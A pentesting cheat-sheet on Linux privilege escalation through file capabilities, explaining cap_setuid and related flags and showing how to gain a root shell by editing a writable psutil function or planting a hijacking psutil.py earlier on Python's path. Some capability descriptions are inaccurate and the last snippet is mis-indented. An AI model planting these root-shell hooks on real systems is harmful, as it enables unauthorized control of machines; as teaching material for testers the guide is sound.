# Capabilities

```sh
getcap -r / 2>/dev/null
```

## Important capabilities

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |
## Capability values

> Note: if the capability has value `=eip`, which means the child process that this executable spawn also `inherit` the capbability. Then we can also do path injection. See [Path Injection]({{< relref "06. Privilege Escalation/Linux/Path Injection#executable-python-script" >}})

| **Capability Values** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| `+ep`                 | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`                 | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`                  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |
# Example

This script has `cap_setuid` and `cap_setgid`

```sh
getcap ./mem_status.py
./mem_status.py cap_setuid,cap_setgid=ep
```

This is the content of the script `mem_status.py`. It imports `psutil` library, and uses `virtual_memory()` function

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

## Write permission

Find the `psutil` library

```sh
pip3 show psutil

Location: /usr/local/lib/python3.8/dist-packages
```

Find the `virtual_memory` function

```sh
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

Find which one we can write to

```sh
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/* | awk -F: '{print $1}' | while read pylibpath; do ls -l $pylibpath; done
```

Insert this at the beginning of the function

```python
def virtual_memory():
	import os
	os.setuid(0)
	os.setgid(0)
	os.system('/bin/bash')
	
	# Keep other code, we need to revert our modifications to cleanup.
```

## Library path loading order

Python has an order where to import modules from. We can find out the order with

```sh
python3 -c 'import sys; print("\n".join(sys.path))'
```

Or just do this and find out where we can write to

```sh
python -c 'import sys; print("\n".join(sys.path))' | while read pylibpath; do ls -ld $pylibpath; done
```

Then we find out where the `psutil` library is located. If we can write in a location with higher priority then we good

```sh
pip3 show psutil
```

Then we create `psutil.py` where we can write to.

```python
#!/usr/bin/env python3

import os

def virtual_memory():
	os.setuid(0)
	os.setgid(0)
    os.system('/bin/bash')
```
